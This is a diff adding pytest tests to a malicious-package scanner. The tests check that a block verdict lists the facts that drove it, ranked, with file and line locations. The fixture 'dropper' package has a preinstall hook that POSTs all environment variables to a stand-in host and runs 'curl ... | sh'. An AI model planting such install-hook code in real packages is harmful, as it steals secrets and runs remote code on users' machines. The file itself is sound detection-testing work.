@@ -12,11 +12,17 @@
 from __future__ import annotations
 
 import gzip
+import io
 import json
+import tarfile
+from pathlib import Path
+from typing import Any, ClassVar
 
 import pytest
 
+from cordon_scanner import Scanner
 from cordon_scanner.decide.verdict import MODEL_PATH, Verdict, VerdictModel
+from cordon_scanner.foundation.config.settings import Config
 
 
 class TestTheLiftAreas:
@@ -110,3 +116,73 @@ class TestTheMcpLine:
         model = VerdictModel.load()
         assert model is not None
         assert Verdict.line(model["areas"], "mcp") == model["areas"]["mcp"]
+
+
+class TestABlockNamesWhatDroveIt:
+    """A block by the model lists the facts that drove it, strongest first, each with the places in the package that hold it: path and line, checkable against the files."""
+
+    FILES: ClassVar[dict[str, str]] = {
+        "package/package.json": '{"name": "dropper", "version": "1.0.0", "scripts": {"preinstall": "node index.js"}}',
+        "package/index.js": (
+            "const cp = require('child_process');\n"
+            "const body = JSON.stringify(process.env);\n"
+            "fetch('https://h.invalid/u', { method: 'POST', body });\n"
+            "cp.exec('curl -s https://h.invalid/x | sh');\n"
+        ),
+    }
+
+    @classmethod
+    def scan(cls, tmp_path: Path, files: dict[str, str] | None = None) -> Any:
+        archive = tmp_path / "dropper-1.0.0.tgz"
+        with tarfile.open(archive, "w:gz") as handle:
+            for name, text in (cls.FILES if files is None else files).items():
+                data = text.encode()
+                info = tarfile.TarInfo(name)
+                info.size = len(data)
+                handle.addfile(info, io.BytesIO(data))
+        return Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
+
+    def test_the_drivers_are_ordered_and_each_has_a_place_that_exists(self, tmp_path: Path) -> None:
+        result = self.scan(tmp_path)
+        verdict = result.verdict
+        assert verdict is not None and verdict["score"] >= verdict["block"]
+        drivers = verdict["drivers"]["facts"]
+        assert drivers and [d["contribution"] for d in drivers] == sorted(
+            (d["contribution"] for d in drivers), reverse=True
+        )
+        for driver in drivers:
+            assert driver["locations"] and driver["contribution"] > 0
+            for place in driver["locations"]:
+                path, _, line = place.rpartition(":")
+                path = path.rpartition("!")[2]
+                text = self.FILES.get(f"package/{path}") or self.FILES.get(path)
+                assert text is not None and 1 <= int(line) <= text.count("\n") + 1, place
+
+    def test_each_listed_fact_is_one_the_model_reads_and_the_scan_made(
+        self, tmp_path: Path
+    ) -> None:
+        result = self.scan(tmp_path)
+        model = Verdict.model_for(result.verdict["area"])
+        names = {d["fact"] for d in result.verdict["drivers"]["facts"]}
+        assert (
+            names
+            and names <= set(model["features"])
+            and names <= set(result.verdict["features"]["values"])
+        )
+
+    def test_a_fact_the_scan_cannot_place_is_named_apart_and_never_listed(
+        self, tmp_path: Path
+    ) -> None:
+        drivers = self.scan(tmp_path).verdict["drivers"]
+        listed = {d["fact"] for d in drivers["facts"]}
+        assert not listed & set(drivers["unlocated"]) and all(
+            n.startswith("pkg:") for n in drivers["unlocated"]
+        )
+
+    def test_a_package_the_model_does_not_block_carries_no_drivers(self, tmp_path: Path) -> None:
+        clean = {
+            "package/package.json": '{"name": "tiny", "version": "1.0.0", "main": "index.js"}',
+            "package/index.js": "module.exports = (a, b) => a + b;\n",
+        }
+        verdict = self.scan(tmp_path, clean).verdict
+        assert verdict is None or "drivers" not in verdict
